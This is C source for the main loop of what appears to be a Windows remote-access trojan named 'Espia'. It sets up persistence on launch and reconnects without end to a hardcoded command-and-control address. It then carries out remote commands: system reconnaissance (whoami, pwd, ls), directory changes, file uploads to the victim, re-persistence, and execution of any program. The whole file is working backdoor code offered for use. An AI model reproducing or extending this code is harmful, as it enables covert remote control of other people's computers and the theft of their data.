#include "EspiaClient/includes/espia.h"

#ifndef WINDOWS_H
#define WINDOWS_H
#include <windows.h> 
#endif

#if DEBUG
#include <stdio.h>
#endif

#define TRY_SERVER 5
#define BUFF_SIZE 1024

int main() {
    /* Allocate a new console and hide it (SW_HIDE) */
	HWND stealth;           
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_NORMAL);
    /* ------------------------------------------- */

    /* Enable persistance */
    persist();
    /* ------------------ */

    /* Keep trying to connect to the server */
	WORD server_status;
	while ((server_status = espia_connect("172.22.240.46", "8888")) == CONNECTION_FAIL)
		Sleep(TRY_SERVER);
    /* ------------------------------------ */

    /* Main flow of the program, command recieving, parsing */
    CHAR recv_buff[BUFF_SIZE];
    PWSTR recv_buffw;
    WCHAR cmd_buff[BUFF_SIZE];
    PWSTR cmd_arg = NULL;
    int cmd_size = -1;
    while (strcmp(recv_buff, "exit") && cmd_size != 0) {
        memset(recv_buff, 0, BUFF_SIZE);
        memset(cmd_buff, 0, BUFF_SIZE);
        cmd_arg = NULL;
        cmd_size = espia_recv(recv_buff, BUFF_SIZE);

        /* If connection error occured keep trying to connect to the server */
        if (cmd_size == RECV_FAIL) {
            WORD server_status;
            while ((server_status = espia_connect("172.22.240.46", "8888")) == CONNECTION_FAIL)
                Sleep(TRY_SERVER);
        }
        /* ------------------------------------ */

        recv_buffw = (PWSTR)recv_buff;
        Debug(printf("Recieved: %ls, size: %d\n", recv_buffw, cmd_size);)

        /* Seperate the command from argument using the whitespace (' ') */
        int i = 0;
        for (i = 0 ; i < cmd_size ; i++) {
            if (*(recv_buffw + i) == L' ') {
                cmd_buff[i] = L'\0';
                cmd_arg = recv_buffw + ++i;
                break;
            }
            cmd_buff[i] = *(recv_buffw + i);
        }

        Debug(printf("Command: %ls\n", cmd_buff);)
        Debug(printf("Argument: %ls\n", cmd_arg);)

        if (wcscmp(cmd_buff, L"whoami") == 0) {
            WCHAR whoami_buff[256 + MAX_COMPUTERNAME_LENGTH + 2];
            memset(whoami_buff, 0, sizeof(whoami_buff));
            whoami(whoami_buff, sizeof(whoami_buff));
            espia_send(whoami_buff, wcslen(whoami_buff)*sizeof(WCHAR));
        } else if (wcscmp(cmd_buff, L"pwd") == 0) {
            WCHAR pwd_buff[MAX_PATH + 1];
            memset(pwd_buff, 0, sizeof(pwd_buff));
            pwd(pwd_buff, sizeof(pwd_buff));
            StringCbCatW(pwd_buff, sizeof(pwd_buff), L"\n");
            espia_send(pwd_buff, wcslen(pwd_buff)*sizeof(WCHAR));
        } else if (wcscmp(cmd_buff, L"ls") == 0) {
            ls(espia_send);
        } else if (wcscmp(cmd_buff, L"cd") == 0) {
            WCHAR err_buff[50];
            if (cd(cmd_arg, err_buff, sizeof(err_buff)) != ESPIA_OK) {
                espia_send(err_buff, wcslen(err_buff)*sizeof(WCHAR));
            }
        } else if (wcscmp(cmd_buff, L"upload") == 0) {
            download_file(cmd_arg , espia_recv, espia_send);
            continue;
        } else if (wcscmp(cmd_buff, L"persist") == 0) {
            WCHAR notify[8] = L"\0";
            if (persist() == 0) {
                StringCbCatW(notify, sizeof(notify), L"Success");
                espia_send(notify, wcslen(notify)*sizeof(WCHAR));
            } else {
                StringCbCatW(notify, sizeof(notify), L"Failed");
                espia_send(notify, wcslen(notify)*sizeof(WCHAR));
            }
        } else if (wcscmp(cmd_buff, L"exec") == 0) {
            STARTUPINFOW info;
            ZeroMemory( &info, sizeof(info));
            info.cb = sizeof(info);
            PROCESS_INFORMATION procinfo;
            ZeroMemory( &procinfo, sizeof(procinfo));
            if (!CreateProcessW(NULL, cmd_arg, NULL, NULL, FALSE, 0, NULL, NULL, &info, &procinfo)) {
                printf("Error: %d\n", GetLastError());
            }
            printf("Waiting..");
            WaitForSingleObject( procinfo.hProcess, INFINITE );
        } else {
            espia_send(recv_buffw, cmd_size);
        }

        WCHAR msg_end[6];
        memset(msg_end, 0, sizeof(msg_end));
        StringCbCatW(msg_end, sizeof(msg_end), L"<end>");
        espia_send(msg_end, sizeof(msg_end));
    }
    /* ---------------------------------------------------- */


    /* Disconnecting from the server */
	espia_disconnect();
    /* ----------------------------- */

	return 0;
}